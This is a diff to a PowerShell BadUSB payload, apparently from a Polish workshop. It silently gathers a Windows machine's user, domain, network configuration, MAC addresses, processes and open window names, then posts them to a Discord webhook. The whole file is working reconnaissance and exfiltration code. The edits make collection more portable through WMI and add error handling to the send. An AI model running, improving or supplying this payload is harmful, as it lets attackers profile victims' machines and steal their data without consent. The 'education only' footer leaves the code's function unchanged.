@@ -5,50 +5,49 @@ param([string]$webhook)
 $compName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 $domain = (Get-WmiObject Win32_ComputerSystem).Domain
-if (!$domain) { $domain = "BRAK (grupa robocza)" }
+if (!$domain -or $domain -eq "") { $domain = "BRAK (grupa robocza)" }
 
-# Sieciówki
-$networks = Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | ForEach-Object {
-    $ip = Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4
-    $gw = (Get-NetRoute -InterfaceIndex $_.ifIndex -DestinationPrefix "0.0.0.0/0").NextHop
-    $dns = (Get-DnsClientServerAddress -InterfaceIndex $_.ifIndex).ServerAddresses -join ", "
+# Sieciówki - używamy WMI (działa wszędzie)
+$networks = @()
+$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}
+foreach ($adapter in $adapters) {
+    $name = (Get-WmiObject Win32_NetworkAdapter | Where-Object {$_.Index -eq $adapter.Index}).Name
+    $ip = $adapter.IPAddress[0]
+    $mask = $adapter.IPSubnet[0]
+    $gw = $adapter.DefaultIPGateway -join ", "
+    $dns = $adapter.DNSServerSearchOrder -join ", "
+    $mac = $adapter.MACAddress
     
-    "📡 {$($_.Name)}`nIP: $($ip.IPAddress)`nMaska: /$($ip.PrefixLength)`nBrama: $gw`nDNS: $dns`nMAC: $($_.MacAddress)"
+    $networks += "📡 $name`nIP: $ip`nMaska: $mask`nBrama: $gw`nDNS: $dns`nMAC: $mac"
 }
+if ($networks.Count -eq 0) { $networks = "Brak połączenia sieciowego" }
 
 # Uptime
-$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+$os = Get-WmiObject Win32_OperatingSystem
+$uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
 $uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
 
 # Procesor i RAM
 $cpu = (Get-WmiObject Win32_Processor).Name
 $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
 
-# Aktywne okna (top 5)
+# Aktywne okna - uproszczone
 $windows = @()
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Window {
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")]
-        public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
+$shell = New-Object -ComObject "Shell.Application"
+$windowsAll = $shell.Windows()
+foreach ($window in $windowsAll) {
+    if ($window.LocationName -and $window.LocationName -ne "") {
+        $windows += $window.LocationName
+        if ($windows.Count -ge 5) { break }
     }
-"@
-for ($i=0; $i -lt 5; $i++) {
-    $hwnd = [Window]::GetForegroundWindow()
-    if ($hwnd -ne 0) {
-        $title = New-Object System.Text.StringBuilder 256
-        [Window]::GetWindowText($hwnd, $title, $title.Capacity)
-        if ($title.ToString()) { $windows += $title.ToString() }
-    }
-    Start-Sleep -Milliseconds 200
 }
+if ($windows.Count -eq 0) { $windows = "Brak lub brak dostępu" }
 
 # Procesy (top 5 po CPU)
 $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | ForEach-Object {
-    "$($_.ProcessName) (CPU: $([math]::Round($_.CPU,1))% | RAM: $([math]::Round($_.WorkingSet/1MB,1))MB)"
+    $cpuUsage = [math]::Round($_.CPU, 1)
+    $ramUsage = [math]::Round($_.WorkingSet/1MB, 1)
+    "$($_.ProcessName) (CPU: $cpuUsage% | RAM: $ramUsage MB)"
 }
 
 # Składamy wiadomość na Discord
@@ -62,11 +61,11 @@ $body = @{
                 @{ name = "👤 Użytkownik"; value = $userName; inline = $true }
                 @{ name = "🏢 Domena"; value = $domain; inline = $true }
                 @{ name = "⏰ Uptime"; value = $uptimeStr; inline = $true }
-                @{ name = "🖥️ CPU"; value = $cpu.Substring(0, [Math]::Min(50, $cpu.Length)) + "..."; inline = $false }
+                @{ name = "🖥️ CPU"; value = $cpu.Substring(0, [Math]::Min(100, $cpu.Length)); inline = $false }
                 @{ name = "🧠 RAM"; value = "$ram GB"; inline = $true }
-                @{ name = "🌐 Sieć"; value = $networks -join "`n`n"; inline = $false }
+                @{ name = "🌐 Sieć"; value = ($networks -join "`n`n").Substring(0, [Math]::Min(1000, ($networks -join "`n`n").Length)); inline = $false }
                 @{ name = "⚙️ Top 5 procesów"; value = $procs -join "`n"; inline = $false }
-                @{ name = "📌 Aktywne okna"; value = if ($windows) { $windows -join "`n" } else { "Brak" }; inline = $false }
+                @{ name = "📌 Aktywne okna"; value = ($windows -join "`n").Substring(0, [Math]::Min(500, ($windows -join "`n").Length)); inline = $false }
             )
             footer = @{ text = "BadUSB Warsztat - Tylko edukacja!" }
             timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
@@ -75,4 +74,9 @@ $body = @{
 } | ConvertTo-Json -Depth 4
 
 # Wysyłamy na Discord
-Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
+try {
+    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
+    Write-Host "OK!" -ForegroundColor Green
+} catch {
+    Write-Host "Błąd: $_" -ForegroundColor Red
+}
